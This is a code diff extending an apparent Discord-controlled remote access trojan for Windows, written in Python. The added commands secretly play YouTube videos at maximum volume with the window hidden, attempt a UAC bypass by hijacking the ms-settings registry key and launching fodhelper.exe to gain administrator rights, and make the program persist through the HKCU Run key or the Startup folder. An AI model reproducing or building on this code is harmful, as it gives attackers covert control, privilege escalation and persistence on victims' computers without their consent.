@@ -10,8 +10,13 @@ import threading
 import requests 
 import time 
 import cv2 
-import win32clipboard 
-import re 
+import win32clipboard
+import win32process
+import win32gui
+import winreg
+import re
+import sys
+import shutil
 import pyautogui
 
 from urllib.request import urlopen, urlretrieve
@@ -502,5 +507,81 @@ async def MessageBox_command(ctx: SlashContext, message: str):
         elif select_ctx.selected_options[0] == 'Questions':
             threading.Thread(target=msgbox, args=(message, 32)).start()
             await select_ctx.edit_origin(content=f"Sent an Question Message Asking {message}")
+
+
+@slash.slash(name="Play", description="Play a chosen youtube video in background", guild_ids=g)
+async def Play_command(ctx: SlashContext, youtube_link: str):
+    if ctx.channel.name == channel_name:
+        MaxVolume()
+        if re.match(r'^(?:http|ftp)s?://', youtube_link) is not None:
+            await ctx.send(f"Playing `{youtube_link}` on **{os.getlogin()}'s** computer")
+            os.system(f'start {youtube_link}')
+            while True:
+                def get_all_hwnd(hwnd, mouse):
+                    def winEnumHandler(hwnd, ctx):
+                        if win32gui.IsWindowVisible(hwnd):
+                            if "youtube" in (win32gui.GetWindowText(hwnd).lower()):
+                                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+                                global pid_process
+                                pid_process = win32process.GetWindowThreadProcessId(hwnd)
+                                return "ok"
+                        else:
+                            pass
+                    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
+                        win32gui.EnumWindows(winEnumHandler,None)
+                try:
+                    win32gui.EnumWindows(get_all_hwnd, 0)
+                except:
+                    break
+        else:
+            await ctx.send("Invalid Youtube Link")
+
+@slash.slash(name="Stop_Play", description="stop the video", guild_ids=g)
+async def Stop_command(ctx: SlashContext):
+    if ctx.channel.name == channel_name:
+        ctx.send("stopped the music")
+        os.system(f"taskkill /F /IM {pid_process[1]}")
+
+
+@slash.slash(name="AdminForce", description="try and bypass uac and get admin rights", guild_ids=g)
+async def AdminForce_command(ctx: SlashContext):
+    if ctx.channel.name == channel_name:
+        await ctx.send(f"attempting to get admin privileges. . .")
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        if is_admin == False:
+            os.system("""powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force""")
+            os.system("""powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force""") 
+            os.system("""powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start""" + sys.argv[0] +"-Force")
+            
+            class disable_fsr():
+                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
+                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
+                def __enter__(self):
+                    self.old_value = ctypes.c_long()
+                    self.success = self.disable(ctypes.byref(self.old_value))
+                def __exit__(self, type, value, traceback):
+                    if self.success:
+                        self.revert(self.old_value)
+            with disable_fsr():
+                os.system("fodhelper.exe")
+
+            sleep(2)
+            os.system("""powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force""")
+        else:
+            await ctx.send("You already have admin privileges")
+
+
+@slash.slash(name="Startup", description="Add the program to startup", guild_ids=g)
+async def Startup_command(ctx: SlashContext, name: str):
+    if ctx.channel.name == channel_name:
+        try:
+            key1 = winreg.HKEY_CURRENT_USER
+            key_value1 ="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+            open_ = winreg.CreateKeyEx(key1,key_value1,0,winreg.KEY_WRITE)
+
+            winreg.SetValueEx(open_,name,0,winreg.REG_SZ, sys.argv[0])
+            open_.Close()
+        except PermissionError:
+            shutil.copy(sys.argv[0], os.getenv("appdata")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+os.path.basename(sys.argv[0]))
 
 client.run(token)
